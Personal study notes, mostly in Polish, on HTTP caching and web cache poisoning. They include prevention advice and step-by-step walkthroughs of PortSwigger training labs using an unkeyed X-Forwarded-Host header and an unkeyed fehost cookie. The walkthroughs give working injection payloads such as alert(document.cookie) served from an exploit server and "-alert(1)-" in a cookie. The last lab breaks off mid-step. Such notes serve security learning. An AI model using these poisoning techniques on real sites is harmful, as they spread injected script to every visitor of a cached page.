 Żądania GET
 <br>
Tak, żądania GET są zwykle cache’owane.
Powód: GET jest idempotentny (czyli nie zmienia stanu serwera).
Cache (przeglądarka, CDN, reverse proxy) może zapamiętać odpowiedź GET i podawać ją kolejnym użytkownikom, jeśli nagłówki i polityka cache na to pozwalają (Cache-Control, Expires).

 <br><br>

Żądania POST
 <br>
Nie, żądań POST zwykle się nie cache’uje.
Powód: POST jest niemal zawsze używany do zmiany stanu serwera (np. wysłanie formularza, dodanie rekordu do bazy).
Cache nie powinien zwracać zapisanej odpowiedzi POST, bo każdy POST może dawać inną odpowiedź w zależności od danych przesyłanych w ciele żądania.

 <br><br>

Zmanipulowane cache
<br>
<img width="737" height="191" alt="image" src="https://github.com/user-attachments/assets/330dc2a1-dfed-4e77-9187-87924fe9c3dd" />


zapobieganie
<br>
Even if you do need to use caching, restricting it to purely static responses is also effective, provided you are sufficiently wary about what you class as "static". For instance, make sure that an attacker can't trick the back-end server into retrieving their malicious version of a static resource instead of the genuine one.

  <br><br>

Nawet jeśli musisz używać cache (pamięci podręcznej), np. dla wydajności, ograniczenie cache tylko do statycznych zasobów (np. obrazki, pliki CSS, JavaScript, które się nie zmieniają dynamicznie) jest skuteczne. Innymi słowy: nie cache’uj dynamicznych stron generowanych indywidualnie dla użytkowników (np. dashboard, koszyk w sklepie, strony z danymi konta), bo to zwiększa ryzyko web cache poisoning. Ważne jest, żeby dokładnie wiedzieć, co naprawdę jest statyczne. Nie wszystko, co wygląda na stałe, musi nim być – np. plik z URL-em /script.js?v=123 może być dynamicznie generowany przez serwer. Trzeba upewnić się, że atakujący nie może wprowadzić własnej, złośliwej wersji pliku, którą serwer potem zapisze w cache zamiast prawdziwego pliku. Przykład: atakujący podmienia URL lub nagłówek w żądaniu, serwer traktuje to jako „statyczny zasób” i zapisuje jego wersję w cache → wszyscy użytkownicy dostają złośliwą wersję.

  <br><br>

https://portswigger.net/research/practical-web-cache-poisoning

   <br><br>

Lab: Web cache poisoning with an unkeyed header

 <br>

unkeyed input – ryzyko web cache poisoning

  <br>

Unkeyed input to dane, które wpływają na odpowiedź serwera, ale nie są brane pod uwagę przy tworzeniu klucza cache, przez co mogą powodować błędy w przechowywaniu i zwracaniu odpowiedzi.

  <br>

1.original request 2x <br>

Miss (response nie znajduje w cache) <br>

Hit (response już jest w cache) <br>
 <br>
  <br>

2. /?cb=kasia123  <br>
Cache: Miss <br>
param min> guest headers <br>
 <br>
  <br>

3. wynik w target > sitemap> issues <br>

x-forwarded-host header is an unkeyed header <br>
 <br>
  <br>

4.  /?cb=kasia123 <br>
X-Forwarded-Host: wartość URL exploit serwera <br>
 <br>

„Hej, traktuj exploit-server.com jako host tej aplikacji.” <br>

Bo Nagłówek X-Forwarded-Host jest używany głównie przez: reverse proxy, load balancer, CDN <br>

  <br>
 <br>
5. exploi server odbity w body. Kopiujemy zasob, który jest dalej. <br>

Jest uzyty przez .js tracking file <br>

/resources/js/tracking.js <br>
 <br>
  <br>

6. Wklejamy w exploit server, <br>

file: /resources/js/tracking.js <br>
body: alert(document.cookie); <br>
 <br>
Store <br>
 <br>
 <br>
7.wysalc jeszcze to samo żądanie, aż będzie cache hit. <br>
 <br>
  <br>

8. w przeglądarce doklejamy do strony głównej <br>
 <br>
/?cb=kasia123 <br>
 <br>
i mamy popup <br>
 <br>
  <br>

9. dystrybuujemy atak do strony głównej <br>
 <br>
W request zostawiamy / i wysyłamy dwa razy <br>
(kasuejmy /?cb=kasia123) <br>
 <br> <br>

 ad3.<br>
 <img width="1003" height="625" alt="image" src="https://github.com/user-attachments/assets/92dc8e00-ad0f-4c37-9dbc-beefc3cf928e" />
<br><br>
ad4.<br>
<img width="1197" height="642" alt="image" src="https://github.com/user-attachments/assets/844f7bf4-b491-479c-94a2-410c23aea46b" />
<br><br>
<hr>
<br><br>
Lab: Web cache poisoning with an unkeyed cookie <br>
 <br>
1. Check / request <br>
 <br> <br>
 

Cache-Control: max-age=30 - może być cache’owana przez 30 sekund, <br>
 <br>
Age: 1 - aktualnie ma 1 sekundę, <br>
 <br>
X-Cache: hit – jest w cache <br>

  <br> <br>

2. Cache- buster GET <br>
 <br>
/?cb=kasia123 hit hit <br>
 <br>
/?cb=kasia1234 hit hit <br>

  <br>

Miss-hit pojawia się tylko po alteracji GET, <br>
po zmianie ciasteczka feshost, zawsze jest hithit <br>

It means, this is query string is a part of cache key <br>

Use this as a part of CB, not to not impack other users visiting / page that we are probing, and to test fresh uncached requests <br> <br>

3.fing unkeyed input: long story short: param>guess cookie z cache buster w GET > MI SKAN NIE DZIAŁA <br>
 <br>
Cookie: session=9gmLxSJpmBeVw8WVG6uWluicMVmP4Cga; fehost=prod-cache-01 <br>
prod-cache-01 jest odbite już w odpowiedzi, wiec jest to ważne zrodlo umieszczenia js <br>
 <br>
Req fehost: <br>
fehost=prod-cache-03 <br>
 <br>
Res:
     ```  <script>

            data = {"host":"0a0a007c030ae19c80036c210097001a.web-security-academy.net","path":"/","frontend":"prod-cache-03"}

        </script>```
 <br> <br>
4. fehost robimy pusty <br>
REQ fehost= <br>
RESP "frontend":"" <br>
 <br> <br>
5. w przeglądarce szukamy <br>
data = {"frontend":"" - alert() -""} <br>
 <br> <br>
Żeby to policzyć: "foo" - alert() - 3 <br>
JS musi: <br>
 <br> <br>
Obliczyć "foo" <br>
Obliczyć alert() <br>
Dopiero potem wykonać odejmowanie <br>
6. REQ fehost="-alert(1)-" to hit <br>
 <br> <br>
7. Remove  /?cd=kasia4 <br>
 <br>
Czyli zatruwamy cache GET / <br> 
hit <br>
 <br> <br>
8. wchodzimy w home w przeglądarce <br>
 <br>
  <br>
  <hr>
   <br> <br>

Lab: Web cache poisoning with multiple headers <br>
 <br>
1.test cache miss hit <br>
2.add CacheBuster in GET (not impact users using homepage) <br>
3. Miss > Skan param miner > guess header : x-forwarded-scheme: <br>
 <br>
Scheme to start url i mowi, czy to będzie http czy ftp czy https <br>
 <br>
x-forwarded-scheme: nohttps <br>
 <br>
tip: żeby testować czy xfs się cachuje, musimy alterowac GET (xfs jest unkeyed) <br>
 <br>
4.Second skan: x-forwarded-scheme: nohttps> Miss>Skan param miner > guess header : x-forwarded-scheme: <br>
